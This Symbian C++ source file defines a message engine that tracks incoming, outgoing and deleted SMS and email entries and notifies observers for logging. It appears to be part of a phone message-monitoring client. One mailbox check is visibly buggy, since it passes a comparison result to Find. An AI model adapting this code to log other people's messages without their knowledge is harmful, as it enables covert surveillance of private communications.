#include "FxsMsgEngine.h"
#include "CltDatabase.h"
#include "Fxsevendef.h"
#include "Global.h"

#include <mtclreg.h> //CClientMtmRegistry
#include <mtclbase.h> //CBaseMtm
#include <MSVIDS.H>
#include <Smut.h>
#include <SmsClnt.h>
#include <SmutHdr.h>
#include <TXTFMLYR.H>
#include <TXTRICH.H>
#include <MIUTSET.H>

CFxsMsgEngine::CFxsMsgEngine(CFxsDatabase& aDb)
:iDb(aDb),
iObservers(3),
iMailServiceIdArray(3)
	{
	}

CFxsMsgEngine::~CFxsMsgEngine()
	{	
	delete iMsvEntry;
	delete iMtmReg;
	delete iMsvSession;	
	iObservers.Close();
	iMailServiceIdArray.Close();
	}

CFxsMsgEngine* CFxsMsgEngine::NewL(CFxsDatabase& aDb)
	{
	CFxsMsgEngine* self = new (ELeave)CFxsMsgEngine(aDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CFxsMsgEngine::ConstructL()
	{
	iMsvSession = CMsvSession::OpenAsyncL(*this);
	}

TInt CFxsMsgEngine::RegisterEvent(TUid aUidMsgType, MFxMsgEventObserver& aObserver)
	{
	TObserverEntry observer(aUidMsgType, aObserver);	
	return iObservers.Append(observer);
	}

void CFxsMsgEngine::OnMsvServerReadyL()
	{
	// message server is ready to use. 
	// its time to create CClientMtmRegistry object
	   iMtmReg = CClientMtmRegistry::NewL(*iMsvSession);
	
	if (!iMsvEntry) 
	   	{
	    iMsvEntry = CMsvEntry::NewL(*iMsvSession, KMsvLocalServiceIndexEntryId/*KMsvGlobalInBoxIndexEntryId*/, TMsvSelectionOrdering());
	   	}
	
	//notify observers that message engine is ready to use
	for(TInt i = 0; i < iObservers.Count(); i++) 
		{
		TObserverEntry& entry=iObservers[i];				
		entry.iObserver.NotifyEngineReady(iMtmReg,iMsvSession);				
		}	
	// find mail boxes service
    FindMailBoxL();
	}
	
void CFxsMsgEngine::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* /*aArg3*/)
	{
	switch (aEvent)
		{
		case EMsvServerReady:
			{
			OnMsvServerReadyL();
			} break;
	    case EMsvEntriesCreated:	    
			{
			TMsvId parentId = *static_cast<TMsvId*>(aArg2);
		    if(KMsvRootIndexEntryId == parentId)
		    //entry under root is created
		    //this entry could be Mail, MMS, WAP Push service
		    //we are interested in ONLY Mail service
		    	{
		    	FindMailBoxL();
		    	}
  			}break;
	    case EMsvEntriesChanged:
		    // Monitoring Incoming Message
		    {
		    LOG0(_L("[CFxsMsgEngine::HandleSessionEventL] case EMsvEntriesChanged "))
		    
    		TMsvId parentId = *static_cast<TMsvId*>(aArg2);
    		
		    //look for changes in the Inbox
		    if(parentId == KMsvGlobalInBoxIndexEntryId || IsMailEntry(parentId))
		       	{
		       	if(aArg1)
		       		{
					CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);
					TInt entriesCount = entries->Count();				
					for(TInt i=0; i<entriesCount;i++) 
						{
						NotifyObserversL(entries->At(i), KCltLogDirIncoming);
						}
		       		}
				}
			} break;
		case EMsvEntriesMoved: 
		//Monitoring Outgoing Message
		// An entry has been moved to another parent				
		// messages have been moved to Sent folder	
			{
			LOG0(_L("[CFxsMsgEngine::HandleSessionEventL] case EMsvEntriesMoved"))
    		
    		TMsvId parentId = *static_cast<TMsvId*>(aArg2);			
			if(parentId == KMsvSentEntryId || parentId == KMsvGlobalOutBoxIndexEntryId)	
				{
				if(aArg1)
					{
					CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);
					TInt entriesCount = entries->Count();
					for(TInt i=0;i<entriesCount; i++)
						{
						NotifyObserversL(entries->At(i), KCltLogDirOutgoing);
						}
					}
				}
			}break;
		case EMsvEntriesDeleted: 
			{
			/** One or more entries have been deleted.	
			aArg1 is a CMsvEntrySelection containing the IDs of the deleted entries. aArg2 
			is the TMsvId of the parent entry.*/
			if(aArg1)
				{
				CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);		   	
				for(TInt i = 0; i < entries->Count(); i ++ )
					{
					TMsvId entryId = entries->At(i);
					NotifyMsgRemoveL(entryId);
					}
				}
			}break;
		case EMsvServerTerminated:
		case EMsvServerFailedToStart:// Something went wrong…
		case EMsvCloseSession:
		default:
			;
	    }
	LOG0(_L("[CFxsMsgEngine::HandleSessionEventL] End"))	
	}
	
void CFxsMsgEngine::MsvEntriesDeletedL()
	{	
	//iDb.MsvEntryDeletedL(iDeletedEntriesId);
	//iDeletedEntriesId.Reset();
	}
	
void CFxsMsgEngine::NotifySMSObserversL(TMsvId aMsvId, TInt aDirection)
	{
	TMsvEntry entry = iMsvEntry->Entry();
	for(TInt i = 0; i < iObservers.Count(); i++) 
		{
		TObserverEntry& observerEntry=iObservers[i];
		if(iSmsEnable && entry.iMtm == observerEntry.iUidMsgType)
			{
			observerEntry.iObserver.NotifyEventL(entry.iMtm, aMsvId,aDirection);				
			}
	   	}
	}
	
void CFxsMsgEngine::NotifyMailObserversL(TMsvId aMsvId, TInt aDirection)
	{
	TMsvEntry entry = iMsvEntry->Entry();
	for(TInt i = 0; i < iObservers.Count(); i++) 
		{
		TObserverEntry& observerEntry=iObservers[i];
		if(entry.iMtm == observerEntry.iUidMsgType)
			{
			//we don't support attachment(s) at the moment
			//so must check this
			//the entry must be under mail box service only
			if(iMailEnable && iMailServiceIdArray.Find(entry.Parent() >= 0))
				{
				observerEntry.iObserver.NotifyEventL(entry.iMtm, aMsvId,aDirection);
				}				
			}
	   	}
	}
	
void CFxsMsgEngine::NotifyObserversL(TMsvId aMsvId, TInt aDirection)
//Precodition
//MsgType of aMsvId is either Mail or SMS
	{
	iMsvEntry->SetEntryL(aMsvId);		
	TMsvEntry entry = iMsvEntry->Entry();
	if(IsMsgTypeMail(entry.iMtm))
		{
		if(iMailEnable)
			{
			//if(entry.BodyTextComplete() && entry.Complete())
			NotifyMailObserversL(aMsvId,aDirection);
			}
		}
	else if(IsMsgTypeSMS(entry.iMtm))
		{
		if(iSmsEnable)
			{
			NotifySMSObserversL(aMsvId,aDirection);
			}		
		}
	//	
	}

void CFxsMsgEngine::NotifyMsgRemoveL(TMsvId aMsvid)
	{
	for(TInt i = 0; i < iObservers.Count(); i++) 
		{
		TObserverEntry& observerEntry=iObservers[i];
		observerEntry.iObserver.NotifyEventRemoveL(aMsvid);
	   	}
	}

TBool CFxsMsgEngine::IsMsgTypeMail(TUid aMtm)
	{
	return (aMtm == KUidMsgTypeSMTP || 
			aMtm == KUidMsgTypePOP3 || 
			aMtm == KUidMsgTypeIMAP4);	
	}
	
TBool CFxsMsgEngine::IsMsgTypeSMS(TUid aMtm)
	{
	return (aMtm== KUidMsgTypeSMS);	
	}
		
TBool CFxsMsgEngine::IsMailEntry(TMsvId aMsvId)
	{
	return (iMailServiceIdArray.Find(aMsvId) > KErrNotFound);
	}
	
void CFxsMsgEngine::FindMailBoxL()
	{
	LOG0(_L("[CFxsMsgEngine::FindMailBoxL]"))
	
	RArray<TMsvId> pop3MailBoxes;
	FindServiceL(KUidMsgTypePOP3, pop3MailBoxes, KMsvRootIndexEntryId);
	
	RArray<TMsvId> imap4MailBoxes;
	FindServiceL(KUidMsgTypeIMAP4, imap4MailBoxes);
	
	for(TInt i=0;i<pop3MailBoxes.Count();i++)
		{
		const TMsvId& mailServiceId = pop3MailBoxes[i];		
		if(iMailServiceIdArray.Find(mailServiceId) == KErrNotFound)
			{
			User::LeaveIfError(iMailServiceIdArray.Append(mailServiceId));			
			}
		}
	
	for(TInt i=0;i<imap4MailBoxes.Count();i++)
		{
		TMsvId mailServiceId = imap4MailBoxes[i];
		if(iMailServiceIdArray.Find(mailServiceId) == KErrNotFound)
			{
			User::LeaveIfError(iMailServiceIdArray.Append(mailServiceId));
			}
		}
	
	pop3MailBoxes.Close();
	imap4MailBoxes.Close();
	}
	
// find the message id of a service given a UID
void CFxsMsgEngine::FindServiceL(TUid aType, RArray<TMsvId>& aResult, TMsvId aParentId)
    {
	CMsvEntry* currentEntry = iMsvSession->GetEntryL(aParentId);//KMsvRootIndexEntryId		
	CleanupStack::PushL(currentEntry);	
	currentEntry->SetSortTypeL(TMsvSelectionOrdering(KMsvNoGrouping,EMsvSortByNone, ETrue));	
	for(TInt i = 0;i<currentEntry->Count();i++)
		{
	    const TMsvEntry& child = (*currentEntry)[i];		
		if (child.iMtm == aType)
	    	{
	        aResult.Append(child.Id());
	        }		
		}
	CleanupStack::PopAndDestroy(currentEntry);
    }

//-----------------------------------------------
//	Inner Class
//-----------------------------------------------
CFxsMsgEngine::TObserverEntry::TObserverEntry(TUid aUidMsgType, MFxMsgEventObserver& aObserver)
:iUidMsgType(aUidMsgType),
iObserver(aObserver)
	{
	}
